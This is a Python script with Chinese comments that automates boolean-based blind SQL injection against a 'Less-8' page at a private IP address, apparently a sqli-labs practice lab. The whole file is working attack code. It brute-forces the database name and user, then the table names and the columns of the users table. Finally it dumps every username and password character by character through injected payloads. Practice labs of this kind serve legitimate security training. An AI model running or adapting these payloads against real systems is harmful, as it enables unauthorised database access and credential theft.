# -*- coding:utf8 -*-
# 盲注

# 爆数据库
import requests
url = 'http://192.168.120.139:30003/Less-8/?id=1%27'  # 这个url要对应你自己的url
payload = " and%20left({d}(),{n})=%27{s}%27%20--%20k"
# 上面两个可以合并为一个,但没有必要,(本来就是我拆开的)
list1 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
         'w', 'x', 'y', 'z', '@', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']  # 字典
str1 = "You are in..........."  # 就是通过返回的页面里有没有这个字符串来判断盲注有没有成功
# 开始对比database()
database = ''
for i in range(1, 10):  # 相当于C语言的for循环1~9 其实这里应该先判断database有多长的
    for ss in list1:  # 相当于for循环遍历list,然后把每一项赋值给ss
        p = payload.format(d='database', n=i, s=database+ss)  # 把payload里的{d},{n},{s}赋值
        u = requests.get(url+p)  # 访问网页
        # print (p)
        if str1 in u.text:  # 如果str在网页内容里面
            database += ss
            print (u"正在对比database第", i, u"个字符",)
            print (database)
            break
print (u"对比成功,database为:", database)
# 开始对比user()#user也是同理
user = ''
for i in range(1, 20):
    for ss in list1:
        p = payload.format(d='user', n=i, s=user+ss)
        u = requests.get(url+p)
        # print p
        if str1 in u.text:
            user += ss
            print (u"正在对比user第", i, u"个字符",)
            print (user)
            break
print (u"对比成功,user为:", user)
print (u"database-->", database)
print (u"user-->", user)


# 爆表
url = 'http://192.168.120.139:30003/Less-8/?id=1%27'
payload = 'and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=' \
          'database()%20limit%20{t},1),{w},1))={A}%20--%20k'
# 我把上面的substr改成了substring按理说mysql里substring和substr是一样的但是如果出错了记得改回substr
list1 = [64, 94, 96, 124, 176, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 173, 175, 95, 65, 66, 67, 68, 69, 70, 71,
         72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103,
         104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 44]
str1 = "You are in..........."
tables1 = ''
tables2 = ''
tables3 = ''
tables4 = ''
for i in range(0, 4):   # 这里要视情况而定,表的数量不定
    for j in range(1, 10):
        for s in list1:
            p = payload.format(t=i, w=j, A=s)
            u = requests.get(url+p)
            if str1 in u.text:
                if i == 0:
                    tables1 += chr(s)
                    print (u"正在对比第1个表,", u"第", j, u"个字符",tables1)
                elif i == 1:
                    tables2 += chr(s)
                    print (u"正在对比第2个表,", u"第", j, u"个字符", tables2)
                elif i == 2:
                    tables3 += chr(s)
                    print (u"正在对比第3个表,", u"第", j, u"个字符", tables3)
                elif i == 3:
                    tables4 += chr(s)
                    print (u"正在对比第4个表,", u"第", j, u"个字符", tables4)
                    break
print ('tables1-->', tables1)
print ('tables2-->', tables2)
print ('tables3-->', tables3)
print ('tables4-->', tables4)


# 盲注users的字段名
list1 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
         'w', 'x', 'y', 'z', '@', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '-', '|', '_', 'A', 'B', 'C',
         'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
         'Z', '.']  # 字典
url = 'http://192.168.120.139:30003/Less-8/?id=1%27'
payload = '%20and%20left((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security' \
          '%27%20and%20table_name=%27users%27%20limit%20{w},1),{n})=%27{c}%27%20--%20k'
# payload其实就是url的后半部分,也是盲注的关键代码,也可以和url变量合并
column = ['', '', '', '', '']
str = 'You are in...........'
# 以上四个变量就是与本次盲注相关的变量了
for j in range(0, 3):
    for i in range(1, 9):
        for l in list1:
            p = payload.format(w=j, n=i, c=column[j]+l)
            u = requests.get(url+p)
            if str in u.text:
                column[j] += l
                print (u'正在对比第', j+1, u'个字段第', i, u'个字符', column[j])
                break
for c in range(0, 5):
    print ('column', c+1, '-->', column[c])



# 查看数据
list1 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
         'w', 'x', 'y', 'z', '@', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '-', '|', '_', 'A', 'B', 'C',
         'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
         'Z', '.']  # 字典
url = 'http://192.168.120.139:30003/Less-8/?id=1%27'
payload = '%20and%20left((select%20username%20from%20users%20where%20id%20={n}),{w})=%27{d}%27%20--%20k'
str = 'You are in...........'
username = ['', '', '', '', '', '', '', '', '', '', '', '', '', '']
password = ['', '', '', '', '', '', '', '', '', '', '', '', '', '']
for i in range(1, 15):
    for j in range(1, 11):
        for l in list1:
            p = payload.format(n=i, w=j, d=username[i-1]+l)
            u = requests.get(url+p)
            if str in u.text:
                username[i-1] += l
                print (u'正在对比第', i, u'个记录的username的第', j, u'个字符', username[i-1])
payload2 = '%20and%20left((select%20password%20from%20users%20where%20id%20={n}),{w})=%27{d}%27%20--%20k'
for i in range(1, 15):
    for j in range(1, 11):
        for l in list1:
            p = payload2.format(n=i, w=j, d=password[i-1]+l)
            u = requests.get(url+p)
            if str1 in u.text:
                password[i-1] += l
                print (u'正在对比第', i, u'个记录的password的第', j, u'个字符', password[i-1])
print ('id    username    password')
for i in range(1, 15):
    print (i, '-', username[i-1], '-', password[i-1])

